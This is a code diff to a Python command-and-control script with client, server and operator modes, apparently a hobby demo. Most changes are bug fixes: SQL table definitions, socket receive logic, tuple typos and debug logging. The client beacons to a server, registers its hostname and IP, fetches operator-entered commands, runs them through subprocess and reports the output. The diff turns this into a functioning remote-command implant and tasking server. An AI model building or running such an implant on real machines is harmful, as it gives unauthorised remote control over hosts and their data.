@@ -24,17 +24,18 @@ CREATE_ENDPOINT_TABLE_SQL = """ CREATE TABLE IF NOT EXISTS endpoints (
                                 hostname text NOT NULL,
                                 first_callback integer NOT NULL,
                                 last_callback integer NOT NULL,
-                                last_ip text NOT NULL,
-                            );"""
+                                last_ip text NOT NULL
+                            )"""
 
 CREATE_TASKING_TABLE_SQL =  """ CREATE TABLE IF NOT EXISTS tasking (
                                 id integer PRIMARY KEY,
+                                endpoint text NOT NULL,
                                 uuid text NOT NULL,
-                                task NOT NULL,
+                                task text NOT NULL,
                                 results text,
                                 created text NOT NULL,
-                                updated text,
-                            );"""
+                                updated text
+                            )"""
 
 """
 # JSON schema for inbound messages to C2 server:
@@ -88,7 +89,7 @@ def pause_for_any_key():
     _ = input("Press any key to continue")
 
 def get_ip_addr():
-    return ip_address(socket.gethostbyname(socket.gethostname()))
+    return socket.gethostbyname(socket.gethostname())
 
 
 class C2Client:
@@ -98,16 +99,17 @@ class C2Client:
             c2_method: str, 
             endpoint_id: uuid = None,
             sleep: int = 30,
-            src_ip: ip_address = get_ip_addr(),
+            src_ip: str = get_ip_addr(),
             hostname: str = socket.gethostname()
             ):
+        logger.debug(src_ip)
         self.dest_ip = dest_ip
         self.dest_port = dest_port
         self.c2_method = c2_method
         self.endpoint_id = endpoint_id
-        self.sleep = sleep,
-        self.src_ip = src_ip,
-        self.hostname = hostname,
+        self.sleep = sleep
+        self.src_ip = src_ip
+        self.hostname = hostname
         self.tasking_queue = []
 
     def c2_server_transaction(self, server_message) -> json:
@@ -118,20 +120,25 @@ class C2Client:
             received_data = b""
             sock.connect((self.dest_ip,self.dest_port))    
             sock.sendall(json.dumps(server_message).encode())
-            data = sock.recv(1024)
-            while data:
-                received_data += data
-                data = sock.recv(1024)
+            data = sock.recv(4096)
+            received_data += data
+            logger.debug(data)
         response_decoded = json.loads(received_data.decode())
+        logger.debug(f"Closing connection to {self.dest_ip}:{self.dest_port}")
         return response_decoded
+
     
     def register_endpoint(self):
         # reach out to C2 server and get an endpoint UUID
         request = {}
         request["type"] = "client"
         request["action"] = "register_endpoint"
-        request["info"] = {"ip":self.src_ip, "hostname": self.hostname}
-        self.endpoint_id = self.c2_server_transaction(server_message=request)
+        request["info"] = {"ip":str(self.src_ip), "hostname": self.hostname}
+        logger.debug(f"ip looks like this before going into json: {self.src_ip} then str formatted: {str(self.src_ip)}")
+        logger.debug(f"request info addr looks like this: {request['info']}")
+        logger.debug(f"request ip addr looks like this: {request['info']['ip']}")
+        logger.debug(f"type: {type(request['info']['ip'])}")
+        self.endpoint_id = self.c2_server_transaction(server_message=request)["response"]["endpoint_id"]
         logger.info(f"registered as {self.endpoint_id}")
 
     def get_tasks(self) -> list:
@@ -139,8 +146,12 @@ class C2Client:
         request = {}
         request["type"] = "client"
         request["action"] = "get_tasks"
+        request["endpoint_id"] = self.endpoint_id
         new_tasks = self.c2_server_transaction(server_message=request)
-        self.tasking_queue.extend([[row.split()[0],row.split()[1]] for row in new_tasks])
+        if len(new_tasks) > 0:
+            self.tasking_queue = [new_tasks.get("response",[None])[0]]
+        else: 
+            self.tasking_queue = []
 
     
     def update_tasking(self):
@@ -155,7 +166,8 @@ class C2Client:
 
     def process_tasking(self, task: str) -> str:
         # yep this is super wonky and prone to huge vulnerabilities and errors.  just a demo
-        results = subprocess.run(task)
+        logger.debug(f"Running {task}")
+        results = subprocess.check_output(task).decode().strip()
         return results
 
 
@@ -163,14 +175,19 @@ class C2Client:
         # loop through callback -> sleep cycle
         shutdown = False
 
+        logger.debug(self.src_ip)
+
         while not shutdown:
             if not self.endpoint_id:
                 self.register_endpoint()
+            logger.debug(f"tasking queue: {self.tasking_queue}")
             for index, row in enumerate(self.tasking_queue):
-                task = row[1]
+                logger.debug(f"tasking: {row}")
+                task = row[1].strip('"')
                 task_id = row[0]
                 results = self.process_tasking(task)
                 self.tasking_queue[index].append(results)
+            logger.debug(f"updated tasking queue: {self.tasking_queue}")
             self.update_tasking()
             time.sleep(self.sleep)
             self.get_tasks()
@@ -191,11 +208,12 @@ class C2Database:
     def add_tasking(self, endpoint: uuid, tasking: json) -> str:
         # add tasking to db
         # return task ID
-        new_task_id = uuid.uuid4()
-        created_date = datetime.datetime.now().isoformat()
-        query = '''INSERT INTO tasking(uuid,task,created) 
-                    Values(?,?,?) '''
-        self.db_cursor.execute(query,(new_task_id, json.dumps(tasking), created_date))
+        new_task_id = str(uuid.uuid4())
+        created_date = str(datetime.datetime.now().isoformat())
+        query = '''INSERT INTO tasking(uuid,endpoint,task,created) 
+                    Values(?,?,?,?) '''
+        self.db_cursor.execute(query,(new_task_id, str(endpoint), json.dumps(tasking), created_date))
+        self.conn.commit()
         return new_task_id
 
     def add_results(self, task_id: str, task_results: str):
@@ -204,19 +222,21 @@ class C2Database:
                     SET results = ? 
                     WHERE uuid = ?'''
         self.db_cursor.execute(query, (task_results, task_id))
+        self.conn.commit()
 
     def query_tasking(self, endpoint: uuid, filter: dict = {}) -> list:
         # pull tasking results from db with option to filter
         # returns list of tasking rows
         if filter.get("id", False):
             query = '''SELECT * FROM tasking WHERE uuid = ?'''
-            data = (filter["id"])
+            data = (filter["id"],)
         elif filter.get("new_tasks", False):
-            query = '''SELECT uuid, task FROM tasking WHERE endpoint = ? and results = NULL'''
-            data = (endpoint)
+            query = '''SELECT uuid, task FROM tasking WHERE endpoint = ? and results IS NULL'''
+            data = (str(endpoint),)
+            logger.debug(str(endpoint))
         else:
             query = '''SELECT * FROM tasking WHERE endpoint = ?'''
-            data = (str(endpoint))
+            data = (str(endpoint),)
         self.db_cursor.execute(query, data)
         return(self.db_cursor.fetchall())
 
@@ -227,15 +247,16 @@ class C2Database:
         logger.info(f"deleting task id: {task_id}")
         self.db_cursor(query, (task_id))
 
-    def register_endpoint(self, hostname: str, last_ip: ip_address) -> str:
+    def register_endpoint(self, hostname: str, last_ip: str) -> str:
         # add new endpoint, give it a UUID, add to endpoints table
         # returns UUID (uuid.uuid4())
-        new_uuid = uuid.uuid4()
-        first_callback = datetime.datetime.now().isoformat()
+        new_uuid = str(uuid.uuid4())
+        first_callback = str(datetime.datetime.now().isoformat())
         last_callback = first_callback
         query = '''INSERT INTO endpoints(uuid,hostname,first_callback,last_callback,last_ip) Values(?,?,?,?,?)'''
         data = (new_uuid, hostname, first_callback, last_callback, last_ip)
         self.db_cursor.execute(query, data)
+        self.conn.commit()
         return new_uuid
 
     def remove_endpoint(self, endpoint: uuid):
@@ -250,7 +271,8 @@ class C2Database:
         query = "SELECT uuid from endpoints;"
         self.db_cursor.execute(query)
         endpoints = self.db_cursor.fetchall()
-        return endpoints.split()
+        logger.debug(endpoints)
+        return endpoints
 
 
 
@@ -279,7 +301,7 @@ class C2Operator:
             elif action == 2:
                 self.select_client()
             elif action == 3:
-                self.query_client_tasking
+                self.query_client_tasking()
                 pause_for_any_key()
             elif action == 4:
                 self.submit_tasking()
@@ -291,9 +313,9 @@ class C2Operator:
         request = {}
         request["type"] = "operator"
         request["action"] = "list_clients"
-        self.clients_list = self.c2_server_transaction(server_message=request)
+        self.clients_list = self.c2_server_transaction(server_message=request)["response"]
         for client in self.clients_list:
-            print(f"client UUID: {client}")
+            print(f"client UUID: {client[0]}")
         
     def select_client(self):
         # dump latest list of clients and have user select number
@@ -301,12 +323,14 @@ class C2Operator:
         while not valid_selection:
             print("### Client List ###")
             for index, client in enumerate(self.clients_list):
-                print(f"{index + 1}:\t{client}")
+                print(f"{index + 1}:\t{client[0]}")
             print("###################")
             try:
                 selection = int(input("Select a client, or 0 to exit: "))
-                if selection >0 and selection <=len(self.clients_list):
-                    self.active_client = self.clients_list[selection - 1]
+                if selection > 0 and selection <=len(self.clients_list):
+                    self.active_client = self.clients_list[selection - 1][0]
+                    print(f"selected {self.active_client}")
+                    valid_selection = True
                 elif selection == 0:
                     valid_selection = True
             except ValueError:
@@ -318,9 +342,11 @@ class C2Operator:
         request["type"] = "operator"
         request["action"] = "query_tasking"
         request["endpoint_id"] = self.active_client
-        client_tasking = self.c2_server_transaction(server_message = request)
+        print(f"querying tasks for endpoint: {self.active_client}")
+        client_tasking = self.c2_server_transaction(server_message = request)["response"]
         
         print(f"Tasking for endpoint {self.active_client}:\n")
+        print("row id\t\tendpoint_id\t\ttask_id\t\tcommand\t\tresults\t\tcreated\t\tupdated")
         for task in client_tasking:
             print(f"{task}\n")
     
@@ -331,20 +357,20 @@ class C2Operator:
         request["action"] = "put_tasking"
         request["endpoint_id"] = self.active_client
         request["tasking"] = []
-        request["tasking"].append(input("Enter tasking line:"))
-        task_id = self.c2_server_transaction(server_message = request)
+        request["tasking"].append(input("Enter tasking line:  "))
+        task_id = self.c2_server_transaction(server_message = request)["response"]["task_id"]
         print(f"Task id: {task_id}")
 
 
 
     def prompt_user_input(self) -> str:
         # ask user to select from actions to take
-        menu = """Select option:\
-            1) list clients\
-            2) select client
-            3) query client tasking\
-            4) submit tasking\
-            5) quit\
+        menu = """Select option:\n
+            1) list clients\n
+            2) select client\n
+            3) query client tasking\n
+            4) submit tasking\n
+            5) quit\n
             Choice: """
         
         while True:
@@ -363,11 +389,10 @@ class C2Operator:
             received_data = b""
             sock.connect((self.server,self.port))    
             sock.sendall(json.dumps(server_message).encode())
-            data = sock.recv(1024)
-            while data:
-                received_data += data
-                data = sock.recv(1024)
-        response_decoded = json.loads(received_data.decode())
+            data = sock.recv(4096)
+            logger.debug(data)
+        response_decoded = json.loads(data.decode())
+        logger.debug(f"Closing connection to {self.server}:{self.port}")
         return response_decoded
                 
 
@@ -407,7 +432,7 @@ class C2Server:
                     if key.data is None:
                         self.accept_wrapper(key.fileobj, sel)
                     else:
-                        shut_down = self.service_connection(key, mask)
+                        shut_down = self.service_connection(key, mask, sel)
                         
         except KeyboardInterrupt:
             logger.error("Received keyboard interrupt, exiting")
@@ -428,25 +453,36 @@ class C2Server:
         events = selectors.EVENT_READ | selectors.EVENT_WRITE
         sel.register(conn, events, data=data)
 
-    def service_connection(self, key, mask):
+    def service_connection(self, key, mask, sel):
         # this is where we read the socket after it's been accepted
         # this lets us pass tasking/querying/actions to/from the client connection
 
         sock = key.fileobj
         data = key.data
+        #logger.debug(data)
+        #logger.debug("running service_connection")
         inbound_data = ""
         data_buffer = ""
         if mask & selectors.EVENT_READ:
             # read until we get everything
             data_buffer = sock.recv(1024)
+            # logger.debug(data_buffer)
             if data_buffer:
-                inbound_data += data_buffer
+                data.outb += data_buffer
             else:
                 # process what we read and prepare response
-                inbound_message = json.loads(inbound_data.decode())
+                logger.info(f"Closing connection to {data.addr}")
+                sel.unregister(sock)
+                sock.close()
+
+        if mask & selectors.EVENT_WRITE:
+            if data.outb:
+                inbound_data = data.outb.decode()
+                logger.debug(f"processing {inbound_data}")
+                inbound_message = json.loads(inbound_data)
                 response = self.process_tasking(inbound_message).encode()
                 sock.send(response)
-        
+                data.outb = None
                 
 
     def set_up_listener(self, host: ip_address, port: int) -> socket.socket:
@@ -474,7 +510,7 @@ class C2Server:
         #  client: register_endpoint, get_tasks, put_results, 
         action = message["action"]
         endpoint_id = message.get("endpoint_id", None)
-        response = {}
+        response = {"action":None, "response": {}}
 
         # these actions should really be defined in a YAML somewhere.  If this module grows this part can get unwieldy
 
@@ -488,9 +524,10 @@ class C2Server:
             response["action"] = "list_tasking_response"
             response["response"] = self.db_conn.query_tasking(endpoint=endpoint_id)
         elif message_type == "operator" and action == "query_tasking":
-            task_id = message["tasking"]["task_id"]
+            # task_id = message["tasking"]["task_id"]
             response["action"] = "query_tasking_response"
-            response["response"] = self.db_conn.query_tasking(endpoint=endpoint_id, filter={"id":task_id})
+            #response["response"] = self.db_conn.query_tasking(endpoint=endpoint_id, filter={"id":task_id})
+            response["response"] = self.db_conn.query_tasking(endpoint=endpoint_id)
         elif message_type == "operator" and action == "list_clients":
             response["action"] = "list_clients_response"
             response["response"] = self.db_conn.list_endpoints()
@@ -499,10 +536,11 @@ class C2Server:
             hostname = message["info"]["hostname"]
             response["action"] = "register_endpoint_response"
             response["response"]["endpoint_id"] =  self.db_conn.register_endpoint(hostname=hostname, last_ip=src_ip)
+            logger.debug(f"registered endpoint IP: {src_ip}")
         elif message_type == "client" and action == "get_tasks":
             response["action"] = "get_tasks_response"
             new_tasks = self.db_conn.query_tasking(endpoint=endpoint_id, filter={"new_tasks": True})
-            response["response"] = new_tasks.splitlines()
+            response["response"] = new_tasks
         elif message_type == "client" and action == "put_results":
             response["action"] = "put_results_response"
             for task in message["tasking"]:
@@ -515,7 +553,8 @@ class C2Server:
 
 
 def main():
-    logging.basicConfig(filename='c2log.log', level=logging.INFO)
+    #logging.basicConfig(filename='c2log.log', level=logging.INFO)
+    
     #parse cmdline arguments
     parser = argparse.ArgumentParser(
         description='C2 script, runs as either client, server, or operator')
@@ -531,11 +570,12 @@ def main():
     args = parser.parse_args()
 
     if args.debug:
+        logging.basicConfig(level=logging.DEBUG)
         logger.setLevel(logging.DEBUG)
+        logger.debug(get_ip_addr())
     
     logger.debug(args)
 
-    logger.info(args)
     if args.mode == 'server':
         server = C2Server(
             c2_method=None,
@@ -549,6 +589,7 @@ def main():
         server.run()
     elif args.mode == 'client':
         client = C2Client(
+            src_ip=get_ip_addr(),
             dest_ip=args.server_ip,
             dest_port=args.callback_port,
             c2_method=None,
@@ -557,7 +598,7 @@ def main():
         client.run()
     else:
         operator = C2Operator(c2_method=None, port=args.operator_port, server=args.server_ip)
-        operator.run_console
+        operator.run_console()
 
 
 if __name__ == "__main__":
